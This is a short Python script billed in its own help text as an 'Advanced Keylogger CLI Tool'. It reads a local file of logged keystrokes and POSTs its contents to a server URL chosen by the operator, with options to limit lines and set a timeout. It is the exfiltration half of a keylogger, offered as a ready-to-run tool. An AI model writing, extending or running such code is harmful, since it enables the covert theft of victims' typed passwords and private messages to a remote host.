import requests
import sys
response = None
print(
'''
REQLOGGER - Advanced Keylogger CLI Tool

Usage:
    reqlogger --u [url] [OPTIONS]
Options:
    --u [url]               Specify the server URL to send logs. default is http://localhost:8000/logs
    --file [path]           Path to save the keylog file locally. default is ./keys.log
    --limit [lines]        Limit the number of lines to send to the server. default is all lines.
    --timeout [seconds]     Set the timeout for the connection. default is 5 seconds.
    --help                  Show this help message.

Examples:
    reqlogger --u http://example.com --file /tmp/keys.log
    reqlogger --u http://example.com --limit 100

For more information, visit: https://github.com/yourrepo/keylogger-advprog
'''
)
argsstr = ' '.join(sys.argv[1:])

argslist = [arg.strip() for arg in argsstr.split('--') if arg.strip()]
argmap = {}
for item in argslist:
    parts = item.split()
    cmd = parts[0]
    options = parts[1:] if len(parts) > 1 else []
    print(item)
    argmap[cmd] = ' '.join(options)
with open(argmap.get('file', 'keys.log'), 'r') as f:
    lines = f.readlines()
    if 'limit' in argmap:
        try:
            limit = int(argmap['limit'])
            lines = lines[-limit:]
        except ValueError:
            print("Invalid limit value. It should be an integer.")
            sys.exit(1)
    data = ''.join(lines)
    url = argmap.get('u', 'http://localhost:8000/logs')
    timeout = int(argmap.get('timeout', '5'))
    try:
        response = requests.post(url, data={'log': data}, timeout=timeout)
        if response.status_code == 200:
            print("Logs sent successfully.")
        else:
            print(f"Failed to send logs. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Error sending logs: {e}")
print("response from server :", response)
print("Exiting...")
